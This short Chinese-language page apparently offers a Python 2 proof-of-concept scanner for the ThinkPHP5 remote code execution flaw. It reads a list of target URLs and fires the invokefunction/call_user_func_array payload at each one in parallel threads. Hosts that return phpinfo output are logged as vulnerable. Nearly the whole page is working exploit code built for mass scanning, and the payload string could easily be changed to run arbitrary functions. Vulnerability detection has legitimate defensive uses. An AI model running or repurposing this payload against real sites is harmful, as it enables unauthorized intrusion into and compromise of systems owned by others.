### thinkphp5命令执行  

### POC检测代码   

```python
# -*- coding:UTF-8 -*-
# evn :python2

import requests
import threading
import time
import sys

class check(threading.Thread):            #判断是否存在这个漏洞的执行函数
    def __init__(self, url, sem):
        super(check, self).__init__()     #继承threading类的构造方法，python3的写法super().__init__()
        self.url = url
        self.sem = sem

    def run(self):
        parameters = "s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"

        try:
            responce = requests.get(url = self.url, params = parameters,timeout=3)
            body = responce.text
            if body.find('PHP Extension') != -1:
                with open("success.txt", "a+") as f1:
                    f1.write("存在tp5远程代码执行漏洞: " + self.url + "\n")
                    print("[+] " + self.url)
            else:
                print("[-] " + self.url)
        except Exception,err:
            print("connect failed")
            pass
        self.sem.release()             #执行完函数，释放线程，线程数加1

class host(threading.Thread):          #遍历文件操作
    def __init__(self, sem):
        super(host, self).__init__()   #继承threading类的构造方法，python3的写法super().__init__()
        self.sem = sem

    def run(self):
        with open("url.txt", "r") as f:
            for host in f.readlines():
                self.sem.acquire()     #遍历一个就获得一个线程，直到达到最大
                host = host.strip()+"/public/index.php"
                host_thread = check(host, self.sem)  
                host_thread.start()    #执行check()的执行函数

if __name__ == '__main__':
    sem = threading.Semaphore(10)      #最大线程数为10个
    thread = host(sem)                 #传递sem值
    thread.start()
```

------
使用方法：在当前页面下创建./url.txt（为需要检测的url），success.txt为含有漏洞的url。

